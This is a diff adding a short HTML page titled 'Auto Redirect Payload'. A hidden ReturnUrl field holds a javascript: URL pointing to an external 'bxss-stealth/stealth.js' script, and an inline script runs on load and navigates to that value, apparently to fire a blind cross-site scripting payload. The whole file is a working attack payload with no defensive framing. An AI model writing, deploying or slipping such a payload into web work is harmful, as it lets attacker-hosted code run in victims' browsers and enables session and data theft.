@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Auto Redirect Payload</title>
+</head>
+<body>
+
+  <input id="ReturnUrl" type="hidden" value="javascript:location.href='https://radenadhiyaksa.github.io/bxss-stealth/stealth.js'" />
+
+  <script>
+    (function(){
+      var ret = document.getElementById("ReturnUrl");
+      if(ret && ret.value.startsWith("javascript:")){
+        window.location = ret.value;
+      }
+    })();
+  </script>
+
+</body>
+</html>
